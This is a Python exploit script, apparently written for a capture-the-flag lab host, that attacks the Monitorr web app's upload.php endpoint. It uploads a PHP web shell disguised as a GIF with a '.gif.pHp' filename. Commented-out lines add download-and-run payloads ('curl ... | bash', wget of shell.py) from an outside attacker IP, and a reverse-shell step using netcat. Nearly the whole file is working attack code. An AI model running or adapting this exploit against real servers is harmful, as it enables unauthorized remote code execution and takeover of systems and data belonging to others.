import os
import random
import requests
import string
import sys
import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

if len (sys.argv) != 4:
	print ("specify params in format: python3 " + sys.argv[0] + " target_url lhost lport")
else:
  rand = ''.join(random.choices(string.ascii_uppercase + string.digits, k = 5))
  name = rand+".jpg"
  name2 = rand+".jpg.php"
  url = sys.argv[1] + "/assets/php/upload.php"
  headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0",
    "Accept": "text/plain, */*; q=0.01",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate",
    "X-Requested-With": "XMLHttpRequest",
    "Content-Type": "multipart/form-data; boundary=---------------------------31046105003900160576454225745",
    "Origin": sys.argv[1],
    "Connection": "close",
    "Referer": sys.argv[1],
    "Cookie" : "isHuman=1; PHPSESSID=3cpm568piu7mmvvqk71snve0kg"
  }

# $python3 exp.py https://monitorr.robyns-petshop.thm/ 10.4.27.248 4242
  # data = "-----------------------------31046105003900160576454225745\r\nContent-Disposition: form-data; name=\"fileToUpload\"; filename=\"" + name + "\"\r\nContent-Type: image/gif\r\n\r\nGIF89a213213123<?php shell_exec(\"$_GET['cmd']\");\r\n\r\n-----------------------------31046105003900160576454225745--\r\n"
  data = "-----------------------------31046105003900160576454225745\r\nContent-Disposition: form-data; name=\"fileToUpload\"; filename=\"she_ll76pg.gif.pHp\"\r\nContent-Type: image/gif\r\n\r\nGIF89a<?php passthru($_GET['cmd']);\r\n\r\n-----------------------------31046105003900160576454225745--\r\n"
  # data = "-----------------------------31046105003900160576454225745\r\nContent-Disposition: form-data; name=\"fileToUpload\"; filename=\"she_ll88pg.gif.pHp\"\r\nContent-Type: image/gif\r\n\r\nGIF88a<?php passthru(\"curl http://10.4.27.248:8081/shell.sh | bash\");\r\n\r\n-----------------------------31046105003900160576454225745--\r\n"
 
  resp = requests.post(url, headers=headers, data=data, verify=False)
  # files = {"name211.jpg": open('a.jpg', 'rb')}
  # resp = requests.post(url, headers=headers, verify=False, files=files)
  print(resp.status_code, resp.text)

  # print ("A shell script should be uploaded. Now we try to execute it")
  # url = sys.argv[1] + "/assets/data/usrimg/" + name
  # headers = {
  #   "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:82.0) Gecko/20100101 Firefox/82.0",
  #   "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
  #   "Accept-Language": "en-US,en;q=0.5",
  #   "Accept-Encoding": "gzip, deflate",
  #   "Connection": "close",
  #   "Upgrade-Insecure-Requests": "1",
  #   "Cookie" : "isHuman=1; PHPSESSID=98mvn2q0khgj6tpibv1eppvrio"
  # }
  # resp = requests.get("https://monitorr.robyns-petshop.thm/assets/data/usrimg/she_ll77pg.gif.php?cmd=wget -O /tmp/shell.py http://10.4.27.248:80/shell.py", headers=headers, verify=False)
  # print(resp.text)

  # print("please remove the http server and start netcat listener")
  # print("Now run: https://monitorr.robyns-petshop.thm/assets/data/usrimg/she_ll77pg.gif.php?cmd=python3 /tmp/shell.py")

  # print(resp.status_code, resp.text)